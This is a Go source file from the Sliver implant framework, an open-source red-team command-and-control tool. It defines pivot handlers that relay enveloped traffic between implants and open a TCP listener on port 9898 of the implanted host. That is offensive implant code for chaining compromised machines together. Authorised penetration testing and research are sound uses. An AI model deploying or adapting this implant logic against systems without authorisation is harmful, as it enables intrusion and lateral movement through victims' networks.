package handlers

import (

	// {{if .Debug}}
	"log"
	// {{end}}

	pb "github.com/bishopfox/sliver/protobuf/sliver"
	"github.com/bishopfox/sliver/sliver/pivots"
	"github.com/bishopfox/sliver/sliver/pivots/tcp"
	"github.com/bishopfox/sliver/sliver/transports"
	"github.com/golang/protobuf/proto"
)

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

var (
	genericPivotHandlers = map[uint32]PivotHandler{
		pb.MsgPivotData: pivotDataHandler,
		pb.MsgTCPReq:    tcpListenerHandler,
	}
)

// GetPivotHandlers - Returns a map of pivot handlers
func GetPivotHandlers() map[uint32]PivotHandler {
	return genericPivotHandlers
}

func pivotDataHandler(envelope *pb.Envelope, connection *transports.Connection) {
	pivData := &pb.PivotData{}
	proto.Unmarshal(envelope.Data, pivData)

	origData := &pb.Envelope{}
	proto.Unmarshal(pivData.Data, origData)

	pivotConn := pivots.GetPivot(pivData.GetPivotID())
	if pivotConn != nil {
		pivots.PivotWriteEnvelope(pivotConn, origData)
	} else {
		// {{if .Debug}}
		log.Printf("[pivotDataHandler] PivotID %d not found\n", pivData.GetPivotID())
		// {{end}}
	}
}

func tcpListenerHandler(envelope *pb.Envelope, connection *transports.Connection) {
	// {{if .Debug}}
	log.Printf("tcpListenerHandler")
	// {{end}}
	tcp.StartTCPListener("0.0.0.0", uint16(9898), connection)
	// TODO: handle error
	tcpResp := &pb.TCP{
		Success: true,
	}
	data, _ := proto.Marshal(tcpResp)
	connection.Send <- &pb.Envelope{
		ID:   envelope.GetID(),
		Data: data,
	}
}
